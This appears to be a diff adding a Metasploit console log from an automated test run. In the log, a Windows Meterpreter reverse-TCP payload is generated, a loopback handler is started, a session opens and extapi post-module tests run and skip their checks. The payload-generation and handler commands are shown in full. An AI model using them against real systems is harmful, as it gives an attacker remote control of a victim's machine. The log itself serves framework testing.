@@ -1,0 +1,27 @@
+use windows/meterpreter_reverse_tcp
+[*] Killing all sessions...
+[*] 127.0.0.1 - Meterpreter session 68 closed.
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> generate -o D:/a/_temp/meterpreter-spec-rb-windows-meterpreter-reverse-tcp20220124-6852-oize0d.exe -f exe MeterpreterTryToFork=false lport=6072 lhost=127.0.0.1
+[4mmsf6[0m payload([1m[31mwindows/meterpreter_reverse_tcp[0m) [0m> [*] Writing 250368 bytes to D:/a/_temp/meterpreter-spec-rb-windows-meterpreter-reverse-tcp20220124-6852-oize0d.exe...
+[4mmsf6[0m payload([1m[31mwindows/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 67
+[4mmsf6[0m payload([1m[31mwindows/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6072 
+[*] Meterpreter session 69 opened (127.0.0.1:6071 -> 127.0.0.1:50301 ) at 2022-01-24 02:01:48 +0000
+use test/extapi
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> run session=69 addentropy=true verbose=true
+
+[*] Loading extapi extension...
+[*] Running against session 69
+[*] Session type is meterpreter and platform is windows
+[*] Starting clipboard management tests
+[*] Session doesn't implement extapi_clipboard_get_data, skipping test
+[*] Starting service management tests
+[*] Session doesn't implement extapi_service_enum, skipping test
+[*] Starting desktop windows management tests
+[*] Session doesn't implement extapi_window_enum, skipping test
+[*] Testing complete in 0.0029283
+[*] Passed: 0; Failed: 0
+[*] Post module execution completed
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> 
